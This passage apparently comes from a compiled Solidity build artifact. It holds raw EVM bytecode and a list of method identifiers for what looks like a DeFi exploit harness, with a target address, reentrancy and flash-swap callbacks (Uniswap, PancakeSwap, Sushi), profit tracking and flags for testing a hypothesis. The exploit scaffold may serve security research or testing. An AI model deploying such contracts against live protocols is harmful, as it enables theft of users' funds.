63454a2ab31461016d578063ec886ff31461018957610153565b36610153577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480156100a2575060025f9054906101000a900460ff165b80156100b057505f60015414155b80156100bd57505f544710155b156101515760015f815460019003919050819055507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f30e36585f546040518263ffffffff1660e01b81526004015f604051808303818588803b158015610139575f5ffd5b505af115801561014b573d5f5f3e3d5ffd5b50505050505b005b5f5ffd5b348015610162575f5ffd5b5061016b6101b1565b005b6101876004803603810190610182919061054a565b61030a565b005b348015610194575f5ffd5b506101af60048036038101906101aa91906105aa565b61045a565b005b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461023f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161023690610654565b60405180910390fd5b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16476040516102849061069f565b5f6040518083038185875af1925050503d805f81146102be576040519150601f19603f3d011682016040523d82523d5f602084013e6102c3565b606091505b5050905080610307576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102fe906106fd565b60405180910390fd5b50565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610398576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161038f90610654565b60405180910390fd5b8034146103da576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103d190610765565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f30e3658826040518263ffffffff1660e01b81526004015f604051808303818588803b158015610440575f5ffd5b505af1158015610452573d5f5f3e3d5ffd5b505050505050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146104e8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104df90610654565b60405180910390fd5b825f81905550816001819055508060025f6101000a81548160ff021916908315150217905550505050565b5f5ffd5b5f819050919050565b61052981610517565b8114610533575f5ffd5b50565b5f8135905061054481610520565b92915050565b5f6020828403121561055f5761055e610513565b5b5f61056c84828501610536565b91505092915050565b5f8115159050919050565b61058981610575565b8114610593575f5ffd5b50565b5f813590506105a481610580565b92915050565b5f5f5f606084860312156105c1576105c0610513565b5b5f6105ce86828701610536565b93505060206105df86828701610536565b92505060406105f086828701610596565b9150509250925092565b5f82825260208201905092915050565b7f6f6e6c79207665726966696572000000000000000000000000000000000000005f82015250565b5f61063e600d836105fa565b91506106498261060a565b602082019050919050565b5f6020820190508181035f83015261066b81610632565b9050919050565b5f81905092915050565b50565b5f61068a5f83610672565b91506106958261067c565b5f82019050919050565b5f6106a98261067f565b9150819050919050565b7f7377656570206661696c656400000000000000000000000000000000000000005f82015250565b5f6106e7600c836105fa565b91506106f2826106b3565b602082019050919050565b5f6020820190508181035f830152610714816106db565b9050919050565b7f6261642076616c756500000000000000000000000000000000000000000000005f82015250565b5f61074f6009836105fa565b915061075a8261071b565b602082019050919050565b5f6020820190508181035f83015261077c81610743565b905091905056fea264697066735822122099170eb146fb2c9d18d9d32c27bc40c449acc6dca06f4548dca6bb10e232da5b64736f6c634300081e003360c060405260405161053c38038061053c8339818101604052810190610025919061012d565b8173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508073ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff1681525050505061016b565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100c182610098565b9050919050565b5f6100d2826100b7565b9050919050565b6100e2816100c8565b81146100ec575f5ffd5b50565b5f815190506100fd816100d9565b92915050565b61010c816100b7565b8114610116575f5ffd5b50565b5f8151905061012781610103565b92915050565b5f5f6040838503121561014357610142610094565b5b5f610150858286016100ef565b925050602061016185828601610119565b9150509250929050565b60805160a0516103b161018b5f395f608301525f61015301526103b15ff3fe608060405260043610610021575f3560e01c8063454a2ab31461006557610061565b36610061576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100589061022b565b60405180910390fd5b5f5ffd5b61007f600480360381019061007a9190610280565b610081565b005b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461010f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610106906102f5565b60405180910390fd5b803414610151576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101489061035d565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f30e3658826040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101b7575f5ffd5b505af11580156101c9573d5f5f3e3d5ffd5b505050505050565b5f82825260208201905092915050565b7f726566756e6420626c6f636b65640000000000000000000000000000000000005f82015250565b5f610215600e836101d1565b9150610220826101e1565b602082019050919050565b5f6020820190508181035f83015261024281610209565b9050919050565b5f5ffd5b5f819050919050565b61025f8161024d565b8114610269575f5ffd5b50565b5f8135905061027a81610256565b92915050565b5f6020828403121561029557610294610249565b5b5f6102a28482850161026c565b91505092915050565b7f6f6e6c79207665726966696572000000000000000000000000000000000000005f82015250565b5f6102df600d836101d1565b91506102ea826102ab565b602082019050919050565b5f6020820190508181035f83015261030c816102d3565b9050919050565b7f6261642076616c756500000000000000000000000000000000000000000000005f82015250565b5f6103476009836101d1565b915061035282610313565b602082019050919050565b5f6020820190508181035f8301526103748161033b565b905091905056fea2646970667358221220b62cef9c26a2fe047af995b4760fcc03bb193d636b33bac579d20e4fb4a063df64736f6c634300081e003360c06040526040516109e43803806109e48339818101604052810190610025919061012d565b8173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508073ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff1681525050505061016b565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100c182610098565b9050919050565b5f6100d2826100b7565b9050919050565b6100e2816100c8565b81146100ec575f5ffd5b50565b5f815190506100fd816100d9565b92915050565b61010c816100b7565b8114610116575f5ffd5b50565b5f8151905061012781610103565b92915050565b5f5f6040838503121561014357610142610094565b5b5f610150858286016100ef565b925050602061016185828601610119565b9150509250929050565b60805160a05161083d6101a75f395f818160a70152818161013601528181610200015261035301525f81816102d00152610423015261083d5ff3fe608060405260043610610037575f3560e01c806335faa41614610042578063454a2ab314610058578063687866b3146100745761003e565b3661003e57005b5f5ffd5b34801561004d575f5ffd5b506100566100a5565b005b610072600480360381019061006d9190610555565b6101fe565b005b61008e60048036038101906100899190610555565b61034e565b60405161009c92919061060a565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610133576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161012a90610692565b60405180910390fd5b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1647604051610178906106dd565b5f6040518083038185875af1925050503d805f81146101b2576040519150601f19603f3d011682016040523d82523d5f602084013e6101b7565b606091505b50509050806101fb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101f29061073b565b60405180910390fd5b50565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461028c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161028390610692565b60405180910390fd5b8034146102ce576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102c5906107a3565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f30e3658826040518263ffffffff1660e01b81526004015f604051808303818588803b158015610334575f5ffd5b505af1158015610346573d5f5f3e3d5ffd5b505050505050565b5f60607f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103df576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103d690610692565b60405180910390fd5b823414610421576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610418906107a3565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff168363f30e365860e01b604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516104d191906107f1565b5f6040518083038185875af1925050503d805f811461050b576040519150601f19603f3d011682016040523d82523d5f602084013e610510565b606091505b508092508193505050915091565b5f5ffd5b5f819050919050565b61053481610522565b811461053e575f5ffd5b50565b5f8135905061054f8161052b565b92915050565b5f6020828403121561056a5761056961051e565b5b5f61057784828501610541565b91505092915050565b5f8115159050919050565b61059481610580565b82525050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f6105dc8261059a565b6105e681856105a4565b93506105f68185602086016105b4565b6105ff816105c2565b840191505092915050565b5f60408201905061061d5f83018561058b565b818103602083015261062f81846105d2565b90509392505050565b5f82825260208201905092915050565b7f6f6e6c79207665726966696572000000000000000000000000000000000000005f82015250565b5f61067c600d83610638565b915061068782610648565b602082019050919050565b5f6020820190508181035f8301526106a981610670565b9050919050565b5f81905092915050565b50565b5f6106c85f836106b0565b91506106d3826106ba565b5f82019050919050565b5f6106e7826106bd565b9150819050919050565b7f7377656570206661696c656400000000000000000000000000000000000000005f82015250565b5f610725600c83610638565b9150610730826106f1565b602082019050919050565b5f6020820190508181035f83015261075281610719565b9050919050565b7f6261642076616c756500000000000000000000000000000000000000000000005f82015250565b5f61078d600983610638565b915061079882610759565b602082019050919050565b5f6020820190508181035f8301526107ba81610781565b9050919050565b5f6107cb8261059a565b6107d581856106b0565b93506107e58185602086016105b4565b80840191505092915050565b5f6107fc82846107c1565b91508190509291505056fea2646970667358221220523d50f0be8ab0dca1d4d49fe28c0e9e041f33e6fa29589f2bf1dc4d45955c1764736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","executeOnOpportunity()":"3c2448ed","exploitPathUsed()":"d78c4281","lockupPathExecuted()":"d723a322","originalHypothesisRefuted()":"73e3b75b","originalHypothesisValidated()":"9159ade2","pancakeCall(address,uint256,uint256,bytes)":"84800812","profitAchieved()":"f0a01176","profitAmount()":"5ff972cc","profitToken()":"49343624","reentrancyPathExecuted()":"9359d6cd","reentrancyPathProfitable()":"2d0455b5","sushiCall(address,uint256,uint256,bytes)":"00991403","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}